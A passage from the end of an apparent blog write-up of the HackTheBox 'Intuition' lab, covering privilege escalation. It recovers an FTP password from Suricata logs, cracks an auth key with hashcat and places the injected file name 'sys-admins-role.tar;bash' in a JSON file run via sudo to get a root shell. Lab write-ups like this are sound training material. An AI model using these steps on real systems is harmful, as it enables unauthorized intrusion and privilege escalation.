class="string">&quot;1:SLaZvboBWDjwD/SXu/SOOcdHzV8=&quot;</span>,<span class="string">&quot;ftp&quot;</span>:&#123;<span class="string">&quot;command&quot;</span>:<span class="string">&quot;USER&quot;</span>,<span class="string">&quot;command_data&quot;</span>:<span class="string">&quot;lopez&quot;</span>,<span class="string">&quot;completion_code&quot;</span>:[<span class="string">&quot;331&quot;</span>],<span class="string">&quot;reply&quot;</span>:[<span class="string">&quot;Username ok, send password.&quot;</span>],<span class="string">&quot;reply_received&quot;</span>:<span class="string">&quot;yes&quot;</span>&#125;&#125;</span><br><span class="line">./eve.json.8.gz:&#123;<span class="string">&quot;timestamp&quot;</span>:<span class="string">&quot;2023-09-28T17:43:52.999165+0000&quot;</span>,<span class="string">&quot;flow_id&quot;</span>:1988487100549589,<span class="string">&quot;in_iface&quot;</span>:<span class="string">&quot;ens33&quot;</span>,<span class="string">&quot;event_type&quot;</span>:<span class="string">&quot;ftp&quot;</span>,<span class="string">&quot;src_ip&quot;</span>:<span class="string">&quot;192.168.227.229&quot;</span>,<span class="string">&quot;src_port&quot;</span>:37522,<span class="string">&quot;dest_ip&quot;</span>:<span class="string">&quot;192.168.227.13&quot;</span>,<span class="string">&quot;dest_port&quot;</span>:21,<span class="string">&quot;proto&quot;</span>:<span class="string">&quot;TCP&quot;</span>,<span class="string">&quot;tx_id&quot;</span>:2,<span class="string">&quot;community_id&quot;</span>:<span class="string">&quot;1:SLaZvboBWDjwD/SXu/SOOcdHzV8=&quot;</span>,<span class="string">&quot;ftp&quot;</span>:&#123;<span class="string">&quot;command&quot;</span>:<span class="string">&quot;PASS&quot;</span>,<span class="string">&quot;command_data&quot;</span>:<span class="string">&quot;Lopezzz1992%123&quot;</span>,<span class="string">&quot;completion_code&quot;</span>:[<span class="string">&quot;530&quot;</span>],<span class="string">&quot;reply&quot;</span>:[<span class="string">&quot;Authentication failed.&quot;</span>],<span class="string">&quot;reply_received&quot;</span>:<span class="string">&quot;yes&quot;</span>&#125;&#125;</span><br><span class="line">./eve.json.8.gz:&#123;<span class="string">&quot;timestamp&quot;</span>:<span class="string">&quot;2023-09-28T17:44:32.133372+0000&quot;</span>,<span class="string">&quot;flow_id&quot;</span>:1218304978677234,<span class="string">&quot;in_iface&quot;</span>:<span class="string">&quot;ens33&quot;</span>,<span class="string">&quot;event_type&quot;</span>:<span class="string">&quot;ftp&quot;</span>,<span class="string">&quot;src_ip&quot;</span>:<span class="string">&quot;192.168.227.229&quot;</span>,<span class="string">&quot;src_port&quot;</span>:45760,<span class="string">&quot;dest_ip&quot;</span>:<span class="string">&quot;192.168.227.13&quot;</span>,<span class="string">&quot;dest_port&quot;</span>:21,<span class="string">&quot;proto&quot;</span>:<span class="string">&quot;TCP&quot;</span>,<span class="string">&quot;tx_id&quot;</span>:1,<span class="string">&quot;community_id&quot;</span>:<span class="string">&quot;1:hzLyTSoEJFiGcXoVyvk2lbJlaF0=&quot;</span>,<span class="string">&quot;ftp&quot;</span>:&#123;<span class="string">&quot;command&quot;</span>:<span class="string">&quot;USER&quot;</span>,<span class="string">&quot;command_data&quot;</span>:<span class="string">&quot;lopez&quot;</span>,<span class="string">&quot;completion_code&quot;</span>:[<span class="string">&quot;331&quot;</span>],<span class="string">&quot;reply&quot;</span>:[<span class="string">&quot;Username ok, send password.&quot;</span>],<span class="string">&quot;reply_received&quot;</span>:<span class="string">&quot;yes&quot;</span>&#125;&#125;</span><br><span class="line">./eve.json.8.gz:&#123;<span class="string">&quot;timestamp&quot;</span>:<span class="string">&quot;2023-09-28T17:44:48.188361+0000&quot;</span>,<span class="string">&quot;flow_id&quot;</span>:1218304978677234,<span class="string">&quot;in_iface&quot;</span>:<span class="string">&quot;ens33&quot;</span>,<span class="string">&quot;event_type&quot;</span>:<span class="string">&quot;ftp&quot;</span>,<span class="string">&quot;src_ip&quot;</span>:<span class="string">&quot;192.168.227.229&quot;</span>,<span class="string">&quot;src_port&quot;</span>:45760,<span class="string">&quot;dest_ip&quot;</span>:<span class="string">&quot;192.168.227.13&quot;</span>,<span class="string">&quot;dest_port&quot;</span>:21,<span class="string">&quot;proto&quot;</span>:<span class="string">&quot;TCP&quot;</span>,<span class="string">&quot;tx_id&quot;</span>:2,<span class="string">&quot;community_id&quot;</span>:<span class="string">&quot;1:hzLyTSoEJFiGcXoVyvk2lbJlaF0=&quot;</span>,<span class="string">&quot;ftp&quot;</span>:&#123;<span class="string">&quot;command&quot;</span>:<span class="string">&quot;PASS&quot;</span>,<span class="string">&quot;command_data&quot;</span>:<span class="string">&quot;Lopezz1992%123&quot;</span>,<span class="string">&quot;completion_code&quot;</span>:[<span class="string">&quot;230&quot;</span>],<span class="string">&quot;reply&quot;</span>:[<span class="string">&quot;Login successful.&quot;</span>],<span class="string">&quot;reply_received&quot;</span>:<span class="string">&quot;yes&quot;</span>&#125;&#125;</span><br><span class="line">dev_acc@intuition:/var/log/suricata$</span><br></pre></td></tr></table></figure></div>
+
+<p>The password is <code>Lopezz1992%123</code><br>Let’s now login as lopez and see what we can run as sudo:</p>
+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">lopez@intuition:~$ <span class="built_in">id</span></span><br><span class="line">uid=1003(lopez) gid=1003(lopez) <span class="built_in">groups</span>=1003(lopez),1004(sys-adm)</span><br><span class="line">lopez@intuition:~$ sudo -l</span><br><span class="line">[sudo] password <span class="keyword">for</span> lopez:</span><br><span class="line">Matching Defaults entries <span class="keyword">for</span> lopez on intuition:</span><br><span class="line">    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty</span><br><span class="line"></span><br><span class="line">User lopez may run the following commands on intuition:</span><br><span class="line">    (ALL : ALL) /opt/runner2/runner2</span><br><span class="line">lopez@intuition:~$ sudo /opt/runner2/runner2</span><br><span class="line">Usage: /opt/runner2/runner2 &lt;json_file&gt;</span><br><span class="line">lopez@intuition:~$</span><br></pre></td></tr></table></figure></div>
+
+<p>I will now be attempting to crack the <code>runner</code> auth_key:</p>
+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~]</span><br><span class="line">└─$ hashcat -m 0 -a 3 <span class="built_in">hash</span> <span class="string">&#x27;UHI75GHI?u?u?u?u&#x27;</span>                                                                                                                                1 ⨯</span><br><span class="line">hashcat (v6.2.6) starting</span><br><span class="line"></span><br><span class="line">OpenCL API (OpenCL 1.2 pocl 1.6, None+Asserts, LLVM 9.0.1, RELOC, SLEEF, DISTRO, POCL_DEBUG) - Platform <span class="comment">#1 [The pocl project]</span></span><br><span class="line">=============================================================================================================================</span><br><span class="line">* Device <span class="comment">#1: pthread-AMD Ryzen 7 4800H with Radeon Graphics, 1439/2942 MB (512 MB allocatable), 4MCU</span></span><br><span class="line"></span><br><span class="line">Minimum password length supported by kernel: 0</span><br><span class="line">Maximum password length supported by kernel: 256</span><br><span class="line"></span><br><span class="line">Hashes: 1 digests; 1 unique digests, 1 unique salts</span><br><span class="line">Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates</span><br><span class="line"></span><br><span class="line">Optimizers applied:</span><br><span class="line">* Zero-Byte</span><br><span class="line">* Early-Skip</span><br><span class="line">* Not-Salted</span><br><span class="line">* Not-Iterated</span><br><span class="line">* Single-Hash</span><br><span class="line">* Single-Salt</span><br><span class="line">* Brute-Force</span><br><span class="line">* Raw-Hash</span><br><span class="line"></span><br><span class="line">ATTENTION! Pure (unoptimized) backend kernels selected.</span><br><span class="line">Pure kernels can crack longer passwords, but drastically reduce performance.</span><br><span class="line">If you want to switch to optimized kernels, append -O to your commandline.</span><br><span class="line">See the above message to find out about the exact limits.</span><br><span class="line"></span><br><span class="line">Watchdog: Temperature abort trigger <span class="built_in">set</span> to 90c</span><br><span class="line"></span><br><span class="line">Host memory required <span class="keyword">for</span> this attack: 0 MB</span><br><span class="line"></span><br><span class="line">0feda17076d793c2ef2870d7427ad4ed:UHI75GHINKOP</span><br><span class="line">&lt;snip&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
+
+<p>The auth key is <code>UHI75GHINKOP</code>.</p>
+<p>Running the <code>/opt/runner2/runner2</code> will start to extract a tar file if the action provided is <code>install</code>, therefore we can create a json file with our tar file alongside the AUTH_KEY, and injecting a command execution payload in the file name (by renaming it) so that the command gets executed when we run the file. However, we must provide a <a class="link"   target="_blank" rel="noopener" href="https://github.com/coopdevs/sys-admins-role/archive/v0.0.3.tar.gz" >valid tar compressed <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> file since <code>/usr/bin/ansible-galaxy</code> will be checking the validity of our file. An example valid json file is as follows:</p>
+<div class="highlight-container" data-rel="Json"><figure class="iseeu highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;run&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span></span><br><span class="line">                <span class="attr">&quot;action&quot;</span><span class="punctuation">:</span><span class="string">&quot;install&quot;</span><span class="punctuation">,</span></span><br><span class="line">                <span class="attr">&quot;role_file&quot;</span><span class="punctuation">:</span><span class="string">&quot;sys-admins-role.tar;bash&quot;</span></span><br><span class="line">        <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;auth_code&quot;</span><span class="punctuation">:</span><span class="string">&quot;UHI75GHINKOP&quot;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure></div>
+
+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">lopez@intuition:~$ <span class="built_in">cat</span> root.json</span><br><span class="line">&#123;</span><br><span class="line">        <span class="string">&quot;run&quot;</span>:&#123;</span><br><span class="line">                <span class="string">&quot;action&quot;</span>:<span class="string">&quot;install&quot;</span>,</span><br><span class="line">                <span class="string">&quot;role_file&quot;</span>:<span class="string">&quot;sys-admins-role.tar;bash&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        <span class="string">&quot;auth_code&quot;</span>:<span class="string">&quot;UHI75GHINKOP&quot;</span></span><br><span class="line">&#125;</span><br><span class="line">lopez@intuition:~$ sudo /opt/runner2/runner2 root.json</span><br><span class="line">[sudo] password <span class="keyword">for</span> lopez:</span><br><span class="line">Starting galaxy role install process</span><br><span class="line">- sys-admins-role.tar is already installed, skipping.</span><br><span class="line">root@intuition:/home/lopez<span class="comment"># id</span></span><br><span class="line">uid=0(root) gid=0(root) <span class="built_in">groups</span>=0(root)</span><br><span class="line">root@intuition:/home/lopez<span class="comment"># cat /root/root.txt</span></span><br><span class="line">7374aa0ff2ad81b85a37431f8fc96186</span><br><span class="line">root@intuition:/home/lopez<span class="comment">#</span></span><br></pre></td></tr></table></figure></div>
+
+<p>And we are root!<br>Hope you enjoyed this writeup :)<br>-0xkujen</p>
+
+        </div>
+
+        
+            <div class="post-copyright-info px-2 sm:px-6 md:px-8">
+                <div class="article-copyright-info-container">
+    <ul>
+        <li><strong>Title:</strong> Hackthebox: Intuition</li>
+        <li><strong>Author:</strong> Foued SAIDI</li>
+        <li><strong>Created at
+                :</strong> 2024-09-13 14:48:23</li>
+        
+            <li>
+                <strong>Updated at
+                    :</strong> 2024-09-14 17:35:41
+            </li>
+        
+        <li>
+            <strong>Link:</strong> https://foued-saidi.tech/2024/09/13/Hackthebox-Intuition/
+        </li>
+        <li>
+            <strong>
+                License:
+            </strong>
+            
+
+            
+                This work is licensed under <a class="license" target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0">CC BY-NC-SA 4.0</a>.
+            
+        </li>
+    </ul>
+</div>
+
+            </div>
+        
+
+        
+
+        
+
+        
+            <div class="article-nav my-8 flex justify-between items-center px-2 sm:px-6 md:px-8">
+                
+                
+                    <div class="article-next border-border-color shadow-redefine-flat shadow-shadow-color-2 rounded-medium px-4 py-2 hover:shadow-redefine-flat-hover hover:shadow-shadow-color-2">
+                        <a class="next"
+                        rel="next"
+                        href="/2024/09/06/Hackthebox-Mailing/"
+                        >
+                            <span class="title flex justify-center items-center">
+                                <span class="post-nav-title-item">Hackthebox: Mailing</span>
+                                <span class="post-nav-item">Next posts</span>
+                            </span>
+                            <span class="right arrow-icon flex justify-center items-center">
+                                <i class="fa-solid fa-chevron-right"></i>
+                            </span>
+                        </a>
+                    </div>
+                
+            </div>
+        
+
+
+        
+    </div>
+
+    
+        <div class="toc-content-container">
+            <div class="post-toc-wrap">
+    <div class="post-toc">
+        <div class="toc-title">On this page</div>
+        <div class="page-title">Hackthebox: Intuition</div>
+        <ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#Overview"><span class="nav-text">Overview</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Reconnaissance"><span class="nav-text">Reconnaissance</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Web-Application-http-auth-comprezzor-htb"><span class="nav-text">Web Application - http:&#x2F;&#x2F;auth.comprezzor.htb </span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Web-Application-http-dashboard-comprezzor-htb"><span class="nav-text">Web Application - http:&#x2F;&#x2F;dashboard.comprezzor.htb </span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Privilege-Escalation"><span class="nav-text">Privilege Escalation</span></a></li></ol>
+
+    </div>
+</div>
+        </div>
+    
+</div>
+
+
+
+                
+
+            </div>
+
+            
+
+        </div>
+
+        <div class="main-content-footer">
+            <footer class="footer mt-5 py-5 h-auto text-base text-third-text-color relative border-t-2 border-t-border-color">
+    <div class="info-container py-3 text-center">
+        
+        <div class="text-center">
+            &copy;
+            
+              <span>2023</span>
+              -
+            
+            2024&nbsp;&nbsp;<i class="fa-solid fa-heart fa-beat" style="--fa-animation-duration: 0.5s; color: #f54545"></i>&nbsp;&nbsp;<a href="/">Foued SAIDI</a>
+        </div>
+        
+            <script data-swup-reload-script src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+            <div class="relative text-center lg:absolute lg:right-[20px] lg:top-1/2 lg:-translate-y-1/2 lg:text-right">
+                
+                    <span id="busuanzi_container_site_uv" class="lg:!block">
+                        <span class="text-sm">VISITOR COUNT</span>
+                        <span id="busuanzi_value_site_uv"></span>
+                    </span>
+                
+                
+                    <span id="busuanzi_container_site_pv" class="lg:!block">
+                        <span class="text-sm">TOTAL PAGE VIEWS</span>
+                        <span id="busuanzi_value_site_pv"></span>
+                    </span>
+                
+            </div>
+        
+        <div class="relative text-center lg:absolute lg:left-[20px] lg:top-1/2 lg:-translate-y-1/2 lg:text-left">
+            <span class="lg:block text-sm">POWERED BY <?xml version="1.0" encoding="utf-8"?><!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd"><svg class="relative top-[2px] inline-block align-baseline" version="1.1" id="圖層_1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" x="0px" y="0px" width="1rem" height="1rem" viewBox="0 0 512 512" enable-background="new 0 0 512 512" xml:space="preserve"><path fill="#0E83CD" d="M256.4,25.8l-200,115.5L56,371.5l199.6,114.7l200-115.5l0.4-230.2L256.4,25.8z M349,354.6l-18.4,10.7l-18.6-11V275H200v79.6l-18.4,10.7l-18.6-11v-197l18.5-10.6l18.5,10.8V237h112v-79.6l18.5-10.6l18.5,10.8V354.6z"/></svg><a target="_blank" class="text-base" href="https://hexo.io">Hexo</a></span>
+            <span class="text-sm lg:block">THEME&nbsp;<a class="text-base" target="_blank" href="https://github.com/EvanNotFound/hexo-theme-redefine">Redefine v2.5.2</a></span>
+        </div>
+        
+        
+            <div>
+                Blog up for <span class="odometer" id="runtime_days" ></span> days <span class="odometer" id="runtime_hours"></span> hrs <span class="odometer" id="runtime_minutes"></span> Min <span class="odometer" id="runtime_seconds"></span> Sec
+            </div>
+        
+        
+            <script data-swup-reload-script>
+                try {
+                    function odometer_init() {
+                    const elements = document.querySelectorAll('.odometer');
+                    elements.forEach(el => {
+                        new Odometer({
+                            el,
+                            format: '( ddd).dd',
+                            duration: 200
+                        });
+                    });
+                    }
+                    odometer_init();
+                } catch (error) {}
+            </script>
+        
+        
+        
+    </div>  
+</footer>
+        </div>
+    </div>
+
+    
+        <div class="post-tools">
+            <div class="post-tools-container">
+    <ul class="article-tools-list">
+        <!-- TOC aside toggle -->
+        
+            <li class="right-bottom-tools page-aside-toggle">
+                <i class="fa-regular fa-outdent"></i>
+            </li>
+        
+
+        <!-- go comment -->
+        
+    </ul>
+</div>
+
+        </div>
+    
+
+    <div class="right-side-tools-container">
+        <div class="side-tools-container">
+    <ul class="hidden-tools-list">
+        <li class="right-bottom-tools tool-font-adjust-plus flex justify-center items-center">
+            <i class="fa-regular fa-magnifying-glass-plus"></i>
+        </li>
+
+        <li class="right-bottom-tools tool-font-adjust-minus flex justify-center items-center">
+            <i class="fa-regular fa-magnifying-glass-minus"></i>
+        </li>
+
+        <li class="right-bottom-tools tool-dark-light-toggle flex justify-center items-center">
+            <i class="fa-regular fa-moon"></i>
+        </li>
+
+        <!-- rss -->
+        
+
+        
+
+        <li class="right-bottom-tools tool-scroll-to-bottom flex justify-center items-center">
+            <i class="fa-regular fa-arrow-down"></i>
+        </li>
+    </ul>
+
+    <ul class="visible-tools-list">
+        <li class="right-bottom-tools toggle-tools-list flex justify-center items-center">
+            <i class="fa-regular fa-cog fa-spin"></i>
+        </li>
+        
+            <li class="right-bottom-tools tool-scroll-to-top flex justify-center items-center">
+                <i class="arrow-up fas fa-arrow-up"></i>
+                <span class="percent"></span>
+            </li>
+        
+        
+    </ul>
+</div>
+
+    </div>
+
+    <div class="image-viewer-container">
+    <img src="">
+</div>
+
+
+    
+
+</main>
+
+
+    
+<script src="/js/libs/Swup.min.js"></script>
+
+<script src="/js/libs/SwupSlideTheme.min.js"></script>
+
+<script src="/js/libs/SwupScriptsPlugin.min.js"></script>
+
+<script src="/js/libs/SwupProgressPlugin.min.js"></script>
+
+<script src="/js/libs/SwupScrollPlugin.min.js"></script>
+
+<script src="/js/libs/SwupPreloadPlugin.min.js"></script>
+
+<script>
+    const swup = new Swup({
+        plugins: [
+            new SwupScriptsPlugin({
+                optin: true,
+            }),
+            new SwupProgressPlugin(),
+            new SwupScrollPlugin({
+                offset: 80,
+            }),
+            new SwupSlideTheme({
+                mainElement: ".main-content-body",
+            }),
+            new SwupPreloadPlugin(),
+        ],
+        containers: ["#swup"],
+    });
+</script>
+
+
+
+
+
+
+
+<script src="/js/tools/imageViewer.js" type="module"></script>
+
+<script src="/js/utils.js" type="module"></script>
+
+<script src="/js/main.js" type="module"></script>
+
+<script src="/js/layouts/navbarShrink.js" type="module"></script>
+
+<script src="/js/tools/scrollTopBottom.js" type="module"></script>
+
+<script src="/js/tools/lightDarkSwitch.js" type="module"></script>
+
+<script src="/js/layouts/categoryList.js" type="module"></script>
+
+
+
+
+
+    
+<script src="/js/tools/codeBlock.js" type="module"></script>
+
+
+
+
+    
+<script src="/js/layouts/lazyload.js" type="module"></script>
+
+
+
+
+    
+<script src="/js/tools/runtime.js"></script>
+
+    
+<script src="/js/libs/odometer.min.js"></script>
+
+    
+<link rel="stylesheet" href="/assets/odometer-theme-minimal.css">
+
+
+
+
+  
+<script src="/js/libs/Typed.min.js"></script>
+
+  
+<script src="/js/plugins/typed.js" type="module"></script>
+
+
+
+
+
+
+
+<div class="post-scripts" data-swup-reload-script>
+    
+        
+<script src="/js/libs/anime.min.js"></script>
+
+        
+<script src="/js/tools/tocToggle.js" type="module"></script>
+
+<script src="/js/layouts/toc.js" type="module"></script>
+
+<script src="/js/plugins/tabs.js" type="module"></script>
+
+    
+</div>
+
+
+</body>
+</html>
